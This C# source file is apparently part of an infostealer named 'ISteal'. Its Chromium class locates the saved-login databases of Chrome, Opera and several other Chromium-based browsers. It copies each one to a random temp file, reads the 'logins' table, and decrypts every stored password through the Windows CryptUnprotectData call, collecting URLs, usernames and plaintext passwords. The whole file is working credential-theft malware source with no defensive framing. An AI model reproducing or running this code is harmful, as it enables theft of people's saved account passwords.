using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using static ISteal.Safe.Structures;

namespace ISteal.Password
{
    class Chromium
    {
        public static IEnumerable<PassData> Initialise()
        {
            List<PassData> list = new List<PassData>();
            string[] array = new string[]
            {
                string.Concat(Environment.GetEnvironmentVariable("LocalAppData"), "\\Google\\Chrome\\User Data\\Default\\Login Data"),
                string.Concat(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "\\Opera Software\\Opera Stable\\Login Data"),
                string.Concat(Environment.GetEnvironmentVariable("LocalAppData"), "\\Kometa\\User Data\\Default\\Login Data"),
                string.Concat(Environment.GetEnvironmentVariable("LocalAppData"), "\\Orbitum\\User Data\\Default\\Login Data"),
                string.Concat(Environment.GetEnvironmentVariable("LocalAppData"), "\\Comodo\\Dragon\\User Data\\Default\\Login Data"),
                string.Concat(Environment.GetEnvironmentVariable("LocalAppData"), "\\Amigo\\User\\User Data\\Default\\Login Data"),
                string.Concat(Environment.GetEnvironmentVariable("LocalAppData"), "\\Torch\\User Data\\Default\\Login Data")
            };
            for (int i = 0; i < array.Length; i++)
            {
                List<PassData> list2 = new List<PassData>();
                try
                {
                    list2 = Get(array[i]);
                }
                catch { }

                if (list2 != null)
                {
                    list.AddRange(list2);
                }
            }
            return list;
        }

        private static List<PassData> Get(string basePath)
        {
            if (!File.Exists(basePath))
            {
                return null;
            }
            string program = "";
            if (basePath.Contains("Chrome"))
            {
                program = "Google Chrome";
            }
            if (basePath.Contains("Yandex"))
            {
                program = "Yandex Browser";
            }
            if (basePath.Contains("Orbitum"))
            {
                program = "Orbitum Browser";
            }
            if (basePath.Contains("Opera"))
            {
                program = "Opera Browser";
            }
            if (basePath.Contains("Amigo"))
            {
                program = "Amigo Browser";
            }
            if (basePath.Contains("Torch"))
            {
                program = "Torch Browser";
            }
            if (basePath.Contains("Comodo"))
            {
                program = "Comodo Browser";
            }
            List<PassData> result;
            try
            {
                string text = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
                if (File.Exists(text))
                {
                    File.Delete(text);
                }
                File.Copy(basePath, text, true);
                Sqlite sqlite = new Sqlite(text);
                List<PassData> list = new List<PassData>();
                sqlite.ReadTable("logins");
                for (int i = 0; i < sqlite.GetRowCount(); i++)
                {
                    try
                    {
                        string text2 = string.Empty;
                        try
                        {
                            byte[] bytes = DecryptChromium(Encoding.Default.GetBytes(sqlite.GetValue(i, 5)), null);
                            text2 = Encoding.UTF8.GetString(bytes);
                        }
                        catch (Exception)
                        {
                        }
                        if (text2 != "")
                        {
                            list.Add(new PassData
                            {
                                Url = sqlite.GetValue(i, 1).Replace("https://", "").Replace("http://", ""),
                                Login = sqlite.GetValue(i, 3),
                                Password = text2,
                                Program = program
                            });
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                }
                File.Delete(text);
                result = list;
            }
            catch (Exception ex2)
            {
                Console.WriteLine(ex2.ToString());
                result = null;
            }
            return result;
        }

        public static byte[] DecryptChromium(byte[] cipherTextBytes, byte[] entropyBytes = null)
        {
            DataBlob dataBlob = default(DataBlob);
            DataBlob dataBlob2 = default(DataBlob);
            DataBlob dataBlob3 = default(DataBlob);
            CryptprotectPromptstruct cryptprotectPromptstruct = new CryptprotectPromptstruct
            {
                cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct)),
                dwPromptFlags = 0,
                hwndApp = IntPtr.Zero,
                szPrompt = null
            };
            string empty = string.Empty;
            try
            {
                try
                {
                    if (cipherTextBytes == null)
                    {
                        cipherTextBytes = new byte[0];
                    }
                    dataBlob2.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
                    dataBlob2.cbData = cipherTextBytes.Length;
                    Marshal.Copy(cipherTextBytes, 0, dataBlob2.pbData, cipherTextBytes.Length);
                }
                catch (Exception)
                {
                }
                try
                {
                    if (entropyBytes == null)
                    {
                        entropyBytes = new byte[0];
                    }
                    dataBlob3.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
                    dataBlob3.cbData = entropyBytes.Length;
                    Marshal.Copy(entropyBytes, 0, dataBlob3.pbData, entropyBytes.Length);
                }
                catch (Exception) { }
                Safe.NativeMethods.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
                byte[] array = new byte[dataBlob.cbData];
                Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
                return array;
            }
            catch (Exception) { }
            finally
            {
                if (dataBlob.pbData != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(dataBlob.pbData);
                }
                if (dataBlob2.pbData != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(dataBlob2.pbData);
                }
                if (dataBlob3.pbData != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(dataBlob3.pbData);
                }
            }
            return new byte[0];
        }
    }
}